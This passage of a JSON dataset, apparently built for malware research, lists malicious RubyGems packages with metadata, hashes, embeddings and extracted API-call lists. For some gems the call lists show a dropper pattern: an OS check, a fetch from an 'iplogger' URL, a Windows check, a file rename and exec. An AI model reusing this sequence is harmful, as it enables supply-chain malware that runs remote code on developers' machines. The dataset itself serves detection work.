markdown_image_link(link)\\n}.join', 'upload_with_directory(dir).map', 'upload_with_directory', 'markdown_image_link', 'puts', 'puts', 'options.[]', 'upload', 'options.[]', 'options.[]', 'generate_markdown_format', 'options.[]', 'protected', 'Qiniu.establish_connection!', 'self.qiniu.[]', 'self.qiniu', 'self.qiniu.[]', 'self.qiniu', '(\"01\"..\"12\").to_a.join', '(\"01\"..\"12\")\\n.to_a', '(\"01\"..\"31\").to_a.join', '(\"01\"..\"31\")\\n.to_a', '(\"01\"..\"12\").to_a.join', '(\"01\"..\"12\")\\n.to_a', '(\"01\"..\"31\").to_a.join', '(\"01\"..\"31\")\\n.to_a', '(\"00\"..\"23\").to_a.join', '(\"00\"..\"23\")\\n.to_a', '(\"00\"..\"59\").to_a.join', '(\"00\"..\"59\")\\n.to_a', '(\"00\"..\"59\").to_a.join', '(\"00\"..\"59\")\\n.to_a']",
            "n_tokens": 885,
            "embedding": "[-0.00869393 -0.01521438  0.00212386 ...  0.00232111 -0.02862249\n  0.02798731]",
            "cluster": "0",
            "id": 442,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bbs-uploader/0.1.6/bbs-uploader-0.1.6.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bbs-uploader/0.1.6/bbs-uploader-0.1.6_extracted",
            "name": "bbs-uploader",
            "version": "0.1.6",
            "published_at": "2020-02-22T01:09:52.582Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, qiniu, hashie",
            "SHA-256": "ec502b0de81b590e335ada8be757ac864972837c7fb80feb730b959309f12579"
        },
        {
            "name_version": "active-scaffold_batch_vho-3.1.7",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'ActiveScaffoldAssets.copy_to_public', 'ActiveScaffoldBatch.root', 'Rails.env.==', 'Rails.env', 'raise', 'ActionView::Base.class_eval', 'include', 'ActiveScaffold.js_framework.==', 'ActiveScaffold.js_framework', 'include', 'ActiveScaffold.js_framework.==', 'ActiveScaffold.js_framework', 'include', 'include', 'base.add_active_scaffold_path', 'File.join', 'ActiveScaffold::Config::BatchBase.plugin_directory', 'base.helper_method', 'protected', 'process_action_link_action', 'process_batch', 'do_batch', 'respond_to?', 'do_search', 'do_list', '@batch_scope.nil?', 'params.[]', 'params', '[\"LISTED\", \"MARKED\"].include?', 'params.[]', 'params', 'params.[]', 'params', 'params.delete', 'params', 'error_records.empty?', 'error_records', 'respond_to?', 'action_name', 'send', 'action_name', 'batch_scope.nil?.!', 'batch_scope.nil?', 'batch_scope', 'respond_to?', 'action_name', 'batch_scope.downcase', 'batch_scope', 'send', 'action_name', 'batch_scope.downcase', 'batch_scope', 'batch_successful?', 'prepare_error_record', 'record.authorized_for?', 'active_scaffold_config.send(action_name).crud_type', 'active_scaffold_config.send', 'active_scaffold_config', 'action_name', 'record.errors.add', 'record.errors', 'as_', 'action_name', 'error_records.<<', 'error_records', 'respond_to?', 'action_name', 'send', 'action_name', 'params.[](:iframe).==', 'params.[]', 'params', 'responds_to_parent', 'render', 'batch_successful?', 'flash.[]=', 'flash', 'as_', 'return_to_main', 'respond_to?', 'action_name', 'send', 'action_name', 'render', 'respond_to?', 'action_name', 'send', 'action_name', 'render', 'response_object.to_xml', 'response_object', 'active_scaffold_config.send(action_name).columns.names', 'active_scaffold_config.send(action_name).columns', 'active_scaffold_config.send', 'active_scaffold_config', 'action_name', 'response_status', 'respond_to?', 'action_name', 'send', 'action_name', 'render', 'response_object.to_json', 'response_object', 'active_scaffold_config.send(action_name).columns.names', 'active_scaffold_config.send(action_name).columns', 'active_scaffold_config.send', 'active_scaffold_config', 'action_name', 'response_status', 'respond_to?', 'action_name', 'send', 'action_name', 'render', 'Hash.from_xml(response_object.to_xml({ only: active_scaffold_config.send(action_name).columns.names })).to_yaml', 'Hash.from_xml', 'response_object.to_xml', 'response_object', 'active_scaffold_config.send(action_name).columns.names', 'active_scaffold_config.send(action_name).columns', 'active_scaffold_config.send', 'active_scaffold_config', 'action_name', 'response_status', 'respond_to?', 'action_name', 'send', 'action_name', '(default_formats + active_scaffold_config.formats + active_scaffold_config.send(action_name).formats)\\n.uniq', 'default_formats + active_scaffold_config.formats.+', 'default_formats.+', 'default_formats', 'active_scaffold_config.formats', 'active_scaffold_config', 'active_scaffold_config.send(action_name).formats', 'active_scaffold_config.send', 'active_scaffold_config', 'action_name', 'base.before_filter', 'base.helper_method', 'base.helper_method', 'base.helper_method', 'base.helper_method', 'do_batch_new', 'respond_to_action', 'batch_action', 'protected', 'batch_successful?', 'render', 'return_to_main', 'render', 'params.[](:iframe).==', 'params.[]', 'params', 'responds_to_parent', 'render', 'batch_successful?', 'flash.[]=', 'flash', 'as_', '@record.to_label', 'return_to_main', 'render', 'render', 'self.successful=', 'do_new', 'marked_records_parent', 'batch_scope', 'active_scaffold_config.columns.[]', 'active_scaffold_config.columns', 'active_scaffold_config', 'batch_create_by_column.to_sym', 'batch_create_by_column', 'column_plural_assocation_value_from_value', 'marked_records_parent', '@marked_records_parent.nil?', 'params.[]', 'params', 'active_scaffold_session_storage', 'params.[]', 'params', 'session_parent.[]', 'Set.new', 'batch_scope.==', 'batch_scope', 'marked_records_parent', 'marked_records_parent.delete', 'marked_records_parent', 'active_scaffold_config.batch_create.columns', 'active_scaffold_config.batch_create', 'active_scaffold_config', 'batch_create_attribute_values_from_params', 'params.[]', 'params', 'do_new', 'batch_create_values.each', 'batch_create_values', 'colunm_form_ui', 'value.[]', 'override_batch_create_value?', 'batch_create_set_record_attribute', 'value.[]', 'value.[]', 'active_scaffold_config.batch_create.process_mode', 'active_scaffold_config.batch_create', 'active_scaffold_config', 'batch_create_by_records.each', 'batch_create_by_records', 'create_record', 'Rails.logger.error', 'Rails.logger', 'active_scaffold_config.batch_create.process_mode', 'active_scaffold_config.batch_create', 'active_scaffold_config', 'active_scaffold_config.batch_create.process_mode', 'active_scaffold_config.batch_create', 'active_scaffold_config', 'batch_create_by_records.each', 'batch_create_by_records', 'create_record', 'Rails.logger.error', 'Rails.logger', 'active_scaffold_config.batch_create.process_mode', 'active_scaffold_config.batch_create', 'active_scaffold_config', 'new_model', 'new_batch_create_record', '@record.nil?', 'do_new', 'record.errors.add', 'record.errors', 'as_', 'created_by.to_label', 'error_records.<<', 'error_records', '@record.send', 'batch_create_by_column.to_s', 'batch_create_by_column', 'batch_create_values.each', 'batch_create_values', 'batch_create_set_record_attribute', 'value.[]', 'value.[]', 'authorized_for_job?', 'create_save', 'successful?', 'unmark_parent_record', 'created_by.id', 'error_records.<<', 'error_records', 'colunm_form_ui', 'override_batch_create_value?', '@record.send', 'send', 'override_batch_create_value', '@record.send', 'column.form_ui', 'form_ui.nil?', 'column.column', 'column.column.type', 'column.column', 'active_scaffold_config.batch_create.default_batch_by_column', 'active_scaffold_config.batch_create', 'active_scaffold_config', 'columns.each', 'new_model', 'attributes.has_key?', 'column.name', 'batch_create_by_column.==', 'batch_create_by_column', 'column.name', 'column_plural_assocation_value_from_value', 'attributes.[]', 'column.name', 'values.[]=', 'column.name', 'column_value_from_param_value', 'attributes.[]', 'column.name', 'authorized_for?', 'respond_to?', 'override_batch_create_value', 'active_scaffold_config.batch_create.link', 'active_scaffold_config.batch_create', 'active_scaffold_config', 'active_scaffold_config.batch_create.class.link', 'active_scaffold_config.batch_create.class', 'active_scaffold_config.batch_create', 'active_scaffold_config', 'self.send', 'link.security_method', 'raise', '(default_formats + active_scaffold_config.formats)\\n.uniq', 'default_formats.+', 'default_formats', 'active_scaffold_config.formats', 'active_scaffold_config', 'active_scaffold_config.batch_create.columns', 'active_scaffold_config.batch_create', 'active_scaffold_config', 'batch_create_columns.collect', 'batch_create_columns', 'base.before_filter', 'batch_action', 'protected', 'active_scaffold_config.batch_destroy.process_mode', 'active_scaffold_config.batch_destroy', 'active_scaffold_config', 'each_record_in_scope', 'authorized_for_job?', 'destroy_record', 'respond_to?', 'do_search', 'beginning_of_chain.where(\"1=1\").delete_all', 'beginning_of_chain.where', 'beginning_of_chain', 'all_conditions', 'Rails.logger.error', 'Rails.logger', 'active_scaffold_config.batch_destroy.process_mode', 'active_scaffold_config.batch_destroy', 'active_scaffold_config', 'active_scaffold_config.batch_destroy.process_mode', 'active_scaffold_config.batch_destroy', 'active_scaffold_config', 'active_scaffold_config.model.marked.each', 'active_scaffold_config.model.marked', 'active_scaffold_config.model', 'active_scaffold_config', 'authorized_for_job?', 'destroy_record', 'active_scaffold_config.model.marked.delete_all', 'active_scaffold_config.model.marked', 'active_scaffold_config.model', 'active_scaffold_config', 'do_demark_all', 'Rails.logger.error', 'Rails.logger', 'active_scaffold_config.batch_destroy.process_mode', 'active_scaffold_config.batch_destroy', 'active_scaffold_config', 'do_destroy', 'successful?', 'batch_scope.==', 'batch_scope', '@record.marked=', 'error_records.<<', 'error_records', 'authorized_for?', 'active_scaffold_config.list.columns.include?(:marked).!', 'active_scaffold_config.list.columns.include?', 'active_scaffold_config.list.columns', 'active_scaffold_config.list', 'active_scaffold_config', 'private', 'active_scaffold_config.batch_destroy.link', 'active_scaffold_config.batch_destroy', 'active_scaffold_config', 'active_scaffold_config.batch_destroy.class.link', 'active_scaffold_config.batch_destroy.class', 'active_scaffold_config.batch_destroy', 'active_scaffold_config', 'self.send', 'link.first.security_method', 'link.first', 'raise', 'base.before_filter', 'base.helper_method', 'base.helper_method', 'do_batch_edit', 'respond_to_action', 'batch_action', 'protected', 'batch_successful?', 'render', 'return_to_main', 'render', '@selected_columns.nil?', 'params.[]', 'params', 'params.[](:record).is_a?', 'params.[]', 'params', 'params.[](:record).each', 'params.[]', 'params', 'value.[](:operator).!=', 'value.[]', '@selected_columns.<<', 'key.to_sym', 'params.[](:iframe).==', 'params.[]', 'params', 'responds_to_parent', 'render', 'batch_successful?', 'flash.[]=', 'flash', 'as_', '@record.to_label', 'return_to_main', 'render', 'render', 'self.successful=', 'do_new', 'active_scaffold_config.batch_update.columns', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'batch_update_attribute_values_from_params', 'params.[]', 'params', 'do_new', 'batch_update_values.each', 'batch_update_values', 'colunm_form_ui', 'value.[]', 'override_batch_update_value?', 'batch_update_set_record_attribute', 'value.[]', 'value.[]', 'active_scaffold_config.batch_update.process_mode', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'each_record_in_scope', 'authorized_for_job?', 'update_record', 'updates_for_update_all', 'updates.first.empty?', 'updates.first', 'respond_to?', 'do_search', 'active_scaffold_config.model.update_all', 'active_scaffold_config.model', 'active_scaffold_config', 'all_conditions', 'Rails.logger.error', 'Rails.logger', 'active_scaffold_config.batch_update.process_mode', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'active_scaffold_config.batch_update.process_mode', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'active_scaffold_config.model.marked.each', 'active_scaffold_config.model.marked', 'active_scaffold_config.model', 'active_scaffold_config', 'authorized_for_job?', 'update_record', 'updates_for_update_all', 'updates.first.empty?', 'updates.first', 'active_scaffold_config.model.marked.update_all', 'active_scaffold_config.model.marked', 'active_scaffold_config.model', 'active_scaffold_config', 'do_demark_all', 'Rails.logger.error', 'Rails.logger', 'active_scaffold_config.batch_update.process_mode', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'batch_update_values.each', 'batch_update_values', 'get_update_all_attribute', 'value.[]', 'value.[]', 'sql_set.nil?', 'update_all.first.<<', 'update_all.first', 'sql_set.include?', 'update_all.<<', 'update_all.[]=', 'update_all.first.join', 'update_all.first', 'batch_update_values.each', 'batch_update_values', 'batch_update_set_record_attribute', 'value.[]', 'value.[]', 'update_save', 'successful?', 'batch_scope.==', 'batch_scope', '@record.marked=', 'error_records.<<', 'error_records', 'colunm_form_ui', 'override_batch_update_value?', '@record.send', 'send', 'override_batch_update_value', '@record.send', 'value.[](:operator).==', 'value.[]', 'value.[]', 'column.form_ui', 'form_ui.nil?', 'column.column', 'column.column.type', 'column.column', 'column.form_ui', 'form_ui.nil?', 'column.column', 'column.column.type', 'column.column', 'override_batch_update_all_value?', 'send', 'override_batch_update_all_value', 'update_value.nil?', 'value.[](:operator).==', 'value.[]', 'value.[]', 'attributes.is_a?', 'columns.each', 'new_model', 'selected_columns.include?', 'selected_columns', 'column.name', 'values.[]=', 'column.name', 'attributes.[](column.name).merge', 'attributes.[]', 'column.name', 'column_value_from_param_value', 'attributes.[](column.name).[]', 'attributes.[]', 'column.name', 'authorized_for?', 'record.send', 'column.name', 'ActiveScaffold::Actions::BatchUpdate::GenericOperators.include?', 'calculation_info.[]', 'ActiveScaffold::Actions::BatchUpdate::NumericOperators.include?', 'calculation_info.[]', 'self.class.condition_value_for_numeric', 'self.class', 'calculation_info.[]', 'calculation_info.[](:opt).==', 'calculation_info.[]', 'current_value / 100.*', 'current_value./', 'calculation_info.[]', 'current_value.present?', 'current_value.+', 'current_value.present?', 'current_value.-', 'current_value.present?', 'current_value.*', 'current_value.present?', 'current_value./', 'alias_method', 'alias_method', 'alias_method', 'ActiveScaffold::Actions::BatchUpdate::GenericOperators.include?', 'calculation_info.[]', 'ActiveScaffold::Actions::BatchUpdate::NumericOperators.include?', 'calculation_info.[]', 'active_scaffold_config.model.quote_value', 'active_scaffold_config.model', 'active_scaffold_config', 'self.class.condition_value_for_numeric', 'self.class', 'calculation_info.[]', 'calculation_info.[](:opt).==', 'calculation_info.[]', 'active_scaffold_config.model.connection.quote_column_name', 'active_scaffold_config.model.connection', 'active_scaffold_config.model', 'active_scaffold_config', 'column.name', 'calculation_info.[]', 'active_scaffold_config.model.quote_value', 'active_scaffold_config.model', 'active_scaffold_config', 'active_scaffold_config.model.connection.quote_column_name', 'active_scaffold_config.model.connection', 'active_scaffold_config.model', 'active_scaffold_config', 'column.name', 'active_scaffold_config.model.connection.quote_column_name', 'active_scaffold_config.model.connection', 'active_scaffold_config.model', 'active_scaffold_config', 'column.name', 'active_scaffold_config.model.connection.quote_column_name', 'active_scaffold_config.model.connection', 'active_scaffold_config.model', 'active_scaffold_config', 'column.name', 'active_scaffold_config.model.connection.quote_column_name', 'active_scaffold_config.model.connection', 'active_scaffold_config.model', 'active_scaffold_config', 'column.name', 'alias_method', 'alias_method', 'alias_method', 'record.send', 'column.name', 'ActiveScaffold::Actions::BatchUpdate::GenericOperators.include?', 'calculation_info.[]', 'ActiveScaffold::Actions::BatchUpdate::DateOperators.include?', 'calculation_info.[]', 'self.class.condition_value_for_datetime', 'self.class', 'calculation_info.[]', 'column.column.type.==', 'column.column.type', 'column.column', 'calculation_info.[]', '[calculation_info.[](\"number\").to_i, 1].max', 'calculation_info.[](\"number\").to_i', 'calculation_info.[]', 'current_value.in', '(trend_number)\\n.send', 'calculation_info.[](\"unit\").downcase.singularize.to_sym', 'calculation_info.[](\"unit\").downcase.singularize', 'calculation_info.[](\"unit\").downcase', 'calculation_info.[]', '[calculation_info.[](\"number\").to_i, 1].max', 'calculation_info.[](\"number\").to_i', 'calculation_info.[]', 'current_value.ago', '(trend_number)\\n.send', 'calculation_info.[](\"unit\").downcase.singularize.to_sym', 'calculation_info.[](\"unit\").downcase.singularize', 'calculation_info.[](\"unit\").downcase', 'calculation_info.[]', 'alias_method', 'respond_to?', 'override_batch_update_value', 'respond_to?', 'override_batch_update_all_value', 'active_scaffold_config.batch_update.link', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'active_scaffold_config.batch_update.class.link', 'active_scaffold_config.batch_update.class', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'self.send', 'link.security_method', 'raise', '(default_formats + active_scaffold_config.formats)\\n.uniq', 'default_formats.+', 'default_formats', 'active_scaffold_config.formats', 'active_scaffold_config', 'active_scaffold_config.batch_update.columns', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'batch_update_columns.collect', 'batch_update_columns', 'cattr_accessor', 'File.expand_path(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb\").match(\"(^.*)/lib/active_scaffold/config/batch_base.rb\").[]', 'File.expand_path(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb\").match', 'File.expand_path', 'self.crud_type=', 'self.class.process_mode', 'self.class', 'self.class.list_mode_enabled', 'self.class', 'ActiveScaffold::DataStructures::ActionLink.new', 'cattr_accessor', 'File.expand_path(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb\").match(\"(^.*)/lib/active_scaffold/config/batch_create.rb\").[]', 'File.expand_path(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb\").match', 'File.expand_path', 'cattr_accessor', 'cattr_accessor', 'attr_accessor', 'attr_accessor', 'attr_accessor', '@core.label', 'as_', 'as_', 'self.crud_type=', 'self.class.link', 'self.class', 'self.class.action_group', 'self.class', 'self.class.action_group.clone', 'self.class.action_group', 'self.class', 'self.class.process_mode', 'self.class', 'ActiveScaffold::DataStructures::ActionLink.new', 'ActiveScaffold::DataStructures::ActionLink.new', 'cattr_accessor', 'File.expand_path(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb\").match(\"(^.*)/lib/active_scaffold/config/batch_destroy.rb\").[]', 'File.expand_path(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb\").match', 'File.expand_path', 'cattr_accessor', 'attr_accessor', 'attr_accessor', '@core.label', 'as_', 'as_', 'self.crud_type=', 'self.class.process_mode', 'self.class', 'self.class.list_mode_enabled', 'self.class', 'ActiveScaffold::DataStructures::ActionLink.new', 'cattr_accessor', 'File.expand_path(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb\").match(\"(^.*)/lib/active_scaffold/config/batch_update.rb\").[]', 'File.expand_path(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb\").match', 'File.expand_path', 'cattr_accessor', 'cattr_accessor', 'attr_accessor', 'attr_accessor', '@core.label', 'as_', 'as_', 'active_scaffold_input_options', 'column.form_ui.==', 'column.form_ui', 'active_scaffold_record_select', 'batch_create_by_records', 'active_scaffold_batch_create_singular_association', 'batch_create_by_records.collect', 'batch_create_by_records', 'r.id', 'options_for_association', 'column.association', 'html_options.update', 'column.options.[]', 'column.options', 'options.update', 'column.options', 'html_options.[]=', 'html_options.[]', 'html_options.[]=', 'select_tag', 'column.name', 'options_for_select', 'select_options.uniq', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'batch_update_values.[](column.name).[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'current_params.merge!', 'batch_update_values.[](column.name).[](:value).symbolize_keys', 'batch_update_values.[](column.name).[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'Rails.logger.info', 'Rails.logger', 'column.name', 'current_params.[](:value).inspect', 'current_params.[]', 'current_params.[](:value).class', 'current_params.[]', 'Rails.logger.info', 'Rails.logger', 'column.name', 'options.inspect', 'current_params.[](:value).is_a?', 'current_params.[]', 'current_params.[]=', 'Rails.logger.info', 'Rails.logger', 'column.name', 'current_params.[](:value).inspect', 'current_params.[]', 'current_params.[](:value).class', 'current_params.[]', 'active_scaffold_update_generic_operators', 'active_scaffold_config.batch_update.process_mode.==', 'active_scaffold_config.batch_update.process_mode', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'operator_options.concat', 'ActiveScaffold::Actions::BatchUpdate::DateOperators.collect', 'as_', 'comp.downcase.to_sym', 'comp.downcase', 'options.merge', '[\"PLUS\", \"MINUS\"].exclude?', 'current_params.[]', 'tags.<<', 'select_tag', 'column.name', 'options_for_select', 'current_params.[]', 'options.[]', 'tags.<<', 'active_scaffold_search_date_bridge_calendar_control', 'current_params.[]', 'tags.<<', 'active_scaffold_update_date_bridge_trend_tag', 'tags.join(\"&nbsp;\").html_safe', 'tags.join', 'active_scaffold_date_bridge_trend_tag', 'current_params.[]', 'current_params.[]', '[\"PLUS\", \"MINUS\"].include?', 'current_params.[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'batch_update_values.[](column.name).[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'current_params.merge!', 'batch_update_values.[](column.name).[](:value).symbolize_keys', 'batch_update_values.[](column.name).[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'active_scaffold_update_generic_operators', 'active_scaffold_config.batch_update.process_mode.==', 'active_scaffold_config.batch_update.process_mode', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'operator_options.concat', 'ActiveScaffold::Actions::BatchUpdate::DateOperators.collect', 'as_', 'comp.downcase.to_sym', 'comp.downcase', 'options.merge', '[\"PLUS\", \"MINUS\"].exclude?', 'current_params.[]', 'tags.<<', 'select_tag', 'column.name', 'options_for_select', 'current_params.[]', 'options.[]', 'tags.<<', 'active_scaffold_search_date_bridge_calendar_control', 'current_params.[]', 'tags.<<', 'active_scaffold_update_date_bridge_trend_tag', 'tags.join(\"&nbsp;\").html_safe', 'tags.join', 'active_scaffold_date_bridge_trend_tag', 'current_params.[]', 'current_params.[]', '[\"PLUS\", \"MINUS\"].include?', 'current_params.[]', 'active_scaffold_input_options', 'override_update_field?', 'send', 'override_update_field', 'column.form_ui', 'override_update?', 'column.form_ui', 'send', 'override_update', 'column.form_ui', 'column.column', 'column.form_ui.nil?', 'column.form_ui', 'override_update?', 'column.column.type', 'column.column', 'send', 'override_update', 'column.column.type', 'column.column', 'active_scaffold_update_generic_operators_select(column, options) << \" \".<<', 'active_scaffold_update_generic_operators_select(column, options).<<', 'active_scaffold_update_generic_operators_select', 'active_scaffold_render_input', 'options.merge', 'column.name', 'ActiveScaffold::Actions::BatchUpdate::GenericOperators.collect', 'as_', 'comp.downcase.to_sym', 'comp.downcase', 'column.column.nil?', 'column.column', 'column.column.null', 'column.column', 'operators.<<', 'as_', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'batch_update_values.[](column.name).[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'current.merge!', 'batch_update_values.[](column.name).[](:value).symbolize_keys', 'batch_update_values.[](column.name).[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'select_tag', 'column.name', 'options_for_select', 'active_scaffold_update_generic_operators', 'current.[]', 'options.[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'batch_update_values.[](column.name).[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'current.merge!', 'batch_update_values.[](column.name).[](:value).symbolize_keys', 'batch_update_values.[](column.name).[]', 'batch_update_values.[]', 'batch_update_values', 'column.name', 'active_scaffold_update_generic_operators(column).+', 'active_scaffold_update_generic_operators', 'ActiveScaffold::Actions::BatchUpdate::NumericOperators.collect', 'as_', 'comp.downcase.to_sym', 'comp.downcase', 'ActiveScaffold::Actions::BatchUpdate::NumericOptions.collect', 'as_', 'comp.downcase.to_sym', 'comp.downcase', 'select_tag', 'column.name', 'options_for_select', 'current.[]', 'options.[]', 'html << \" \".<<', 'html.<<', 'text_field_tag', 'column.name', 'current.[]', 'active_scaffold_input_text_options', 'html << \" \".<<', 'html.<<', 'select_tag', 'column.name', 'options_for_select', 'current.[]', 'options.[]', 'alias_method', 'alias_method', 'alias_method', 'active_scaffold_update_scope_select_options', 'select_options.length.>', 'select_options.length', 'select_tag', 'options_for_select', 'batch_scope', 'select_options.last.[]', 'select_options.last', 'select_options.empty?', 'hidden_field_tag', 'select_options.first.[]', 'select_options.first', 'active_scaffold_config.batch_update.list_mode_enabled', 'active_scaffold_config.batch_update', 'active_scaffold_config', 'select_options.<<', 'as_', 'active_scaffold_config.actions.include?', 'active_scaffold_config.actions', 'active_scaffold_config', 'select_options.<<', 'as_', 'respond_to?', 'override_update_field', 'column.name', 'respond_to?', 'override_update', 'require', 'require', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted/active-scaffold_batch_vho-3.1.7_sourcecode.rb\").+', 'File.dirname', 'ActiveScaffold.autoload_subdir', 'File.dirname', 'ActiveScaffold.autoload_subdir', 'File.dirname', 'ActiveScaffold.autoload_subdir', 'File.dirname', 'I18n.load_path', 'Dir.[]', 'File.join', 'File.dirname', 'ActiveScaffold::Config::Core.class_eval', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[](:collection).[]=', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[]', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[](:collection).[]=', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[]', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[](:collection).[]=', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[]', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[](:collection).[]=', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[]', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[](:collection).[]=', 'ActionDispatch::Routing::ACTIVE_SCAFFOLD_CORE_ROUTING.[]', 'initializer', 'ActiveSupport.on_load', 'require', 'ActiveSupport.on_load', 'include', 'ActiveScaffold.js_framework.==', 'ActiveScaffold.js_framework', 'include', 'ActiveScaffold.js_framework.==', 'ActiveScaffold.js_framework', 'include', 'include', 'Rails.env.==', 'Rails.env', 'raise', '[MAJOR, MINOR, PATCH].compact.join', '[MAJOR, MINOR, PATCH].compact', 'require']",
            "n_tokens": 6961,
            "embedding": "[ 0.00322749 -0.00372726 -0.01292863 ...  0.01289127 -0.01277917\n  0.02070076]",
            "cluster": "0",
            "id": 403,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/active-scaffold_batch_vho/3.1.7/active-scaffold_batch_vho-3.1.7_extracted",
            "name": "active-scaffold_batch_vho",
            "version": "3.1.7",
            "published_at": "2020-02-22T04:21:41.127Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "shoulda, bundler, simplecov, active_scaffold_vho",
            "SHA-256": "007d904947812b89cdfe064a25b595aaa5f2b9dcc07e4e56c39947e2d0a44994"
        },
        {
            "name_version": "royal-mail_api-0.1.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/royal-mail_api/0.1.1/royal-mail_api-0.1.1_extracted/royal-mail_api-0.1.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'File.dirname', '__dir__', 'attr_reader', 'block_given?', 'raise', 'Config.new', 'config', 'attr_accessor', 'attr_accessor', 'args.is_a?', 'raise', 'ArgumentError', 'args.present?', 'raise', 'ArgumentError', 'args.[]', 'args.[]', 'attr_accessor', 'args.[]', 'args.[]', 'RoyalMailApi::XmlParser.new', 'set_faultcode', 'set_faultstring', 'set_description', 'private', 'parser.parse_text', 'parser', 'xml', 'parser.parse_text', 'parser', 'xml', 'SOAP_FAULT_DESCRIPTIONS.fetch', 'faultcode', 'faultcode', 'build_xml', 'config.logger.info', 'config.logger', 'config', 'savon.call', 'savon', 'config.logger.error', 'config.logger', 'config', 'e.http.code', 'e.http', 'config.logger.error', 'config.logger', 'config', 'e.xml', 'raise', 'RoyalMailApi::SoapError.new', 'e.xml', 'e.http.code', 'e.http', 'private', 'XmlBuilder.new(:create_shipment, attrs.merge(security_attrs)).build', 'XmlBuilder.new', 'attrs.merge', 'security_attrs', 'config.password', 'config', 'Time.now.utc.strftime', 'Time.now.utc', 'Time.now', 'rand(999999).to_s', 'rand', 